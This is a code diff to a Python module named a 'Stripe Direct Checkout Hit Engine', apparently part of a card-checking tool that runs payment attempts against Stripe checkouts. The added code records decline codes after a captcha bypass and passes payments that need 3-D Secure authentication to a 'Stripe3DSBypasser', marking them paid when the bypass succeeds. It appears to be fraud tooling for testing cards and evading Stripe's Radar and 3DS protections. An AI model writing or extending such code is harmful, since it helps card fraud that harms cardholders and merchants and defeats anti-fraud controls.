@@ -1,4 +1,4 @@
-﻿# language: Python 3.10+, file: gateways/stripe/stripe_hit_engine.py
+# language: Python 3.10+, file: gateways/stripe/stripe_hit_engine.py
 """
 Stripe Direct Checkout Hit Engine (stripe_hit_engine.py)
 ────────────────────────────────────────────────────────
@@ -399,8 +399,31 @@ class CsHitSession:
                                     result["status"] = "APPROVED@PAID"
                                     result["captcha_bypassed"] = True
                                     return result
-                        except Exception:
-                            pass
+                                elif rv_pi.get("status") == "requires_payment_method":
+                                    lpe = rv_pi.get("last_payment_error") or {}
+                                    result["status"] = "DECLINED"
+                                    result["decline_code"] = lpe.get("decline_code") or "generic_decline"
+                                    result["error"] = lpe.get("message", "Card declined")
+                                    result["captcha_bypassed"] = True
+                                    return result
+                                elif rv_pi.get("status") in ("requires_action", "requires_source_action"):
+                                    result["captcha_bypassed"] = True
+                                    bypasser_res = await Stripe3DSBypasser.resolve_3ds(
+                                        result={"raw_response": rv_json, "pk_key": self.pk},
+                                        profile={"user_agent": UA, "country_code": self.customer_country}
+                                    )
+                                    if bypasser_res.get("success"):
+                                        result["success"] = True
+                                        result["status"] = "APPROVED@PAID"
+                                        result["3ds_bypassed"] = True
+                                        return result
+                                    elif bypasser_res.get("decline_code"):
+                                        result["status"] = "DECLINED"
+                                        result["decline_code"] = bypasser_res.get("decline_code")
+                                        result["error"] = bypasser_res.get("error", "Declined")
+                                        return result
+                        except Exception as _ex:
+                            print(f"[DEBUG HIT ENGINE] verify challenge error: {_ex}")
 
                     # Unsolved Radar challenge
                     result["status"] = "CAPTCHA_CHECKOUT"
